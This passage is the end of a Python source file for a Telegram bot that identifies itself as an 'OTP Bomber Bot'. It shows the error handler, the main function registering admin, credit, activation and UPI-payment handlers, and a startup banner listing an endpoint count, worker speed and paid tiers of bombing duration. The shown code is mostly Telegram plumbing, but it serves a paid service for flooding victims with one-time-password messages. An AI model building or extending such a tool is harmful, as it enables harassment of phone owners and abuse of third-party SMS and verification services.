    update_setting('upi_id', upi_id)
    await update.message.reply_text(f"✅ UPI ID set to: {upi_id}")

# ===== ERROR HANDLER =====
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    
    if isinstance(error, Conflict):
        logger.warning("Conflict error - another instance is running. Stopping this instance.")
        try:
            await context.bot.send_message(chat_id=ADMIN_IDS[0], text="⚠️ Another bot instance detected! Stopping this instance.")
        except:
            pass
        os._exit(1)
        return
    
    logger.error(msg="Exception while handling an update:", exc_info=error)
    
    try:
        for admin_id in ADMIN_IDS:
            await context.bot.send_message(chat_id=admin_id, text=f"❌ Bot Error\n\n{str(error)[:500]}")
    except:
        pass

# ===== MAIN =====
def main():
    try:
        try:
            import requests
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        except:
            pass
        
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("broadcast", broadcast_command))
        app.add_handler(CommandHandler("addcredits", add_credits_command))
        app.add_handler(CommandHandler("activate", activate_command))
        app.add_handler(CommandHandler("setqr", set_qr_command))
        app.add_handler(CommandHandler("setupi", set_upi_command))
        
        app.add_handler(MessageHandler(filters.PHOTO, handle_message))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        app.add_handler(CallbackQueryHandler(paid_button, pattern="^paid_"))
        app.add_handler(CallbackQueryHandler(back_inline, pattern="^back_inline$"))
        app.add_handler(CallbackQueryHandler(approve_payment, pattern="^approve_"))
        app.add_handler(CallbackQueryHandler(decline_payment, pattern="^decline_"))
        
        app.add_error_handler(error_handler)
        
        print("🔥 OTP Bomber Bot - All APIs Added!")
        print(f"👥 Admins: {ADMIN_IDS}")
        print(f"📡 Endpoints: {len(ENDPOINTS)}")
        print(f"⚡ Speed: FAST (Max Workers: {MAX_WORKERS})")
        print("\n✅ QR FIXED - No NoneType error")
        print("\n⏱️ Auto-Stop Timers:")
        print("   Free → 2 minutes")
        print("   1 Day Premium → 5 minutes")
        print("   1 Month Premium → 5 hours")
        print("   3 Month Premium → 8 hours")
        
        app.run_polling(drop_pending_updates=True)
        
    except Conflict as e:
        print(f"\n⚠️ Another bot instance is running!")
        print("Please close all other instances and restart.")
        
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
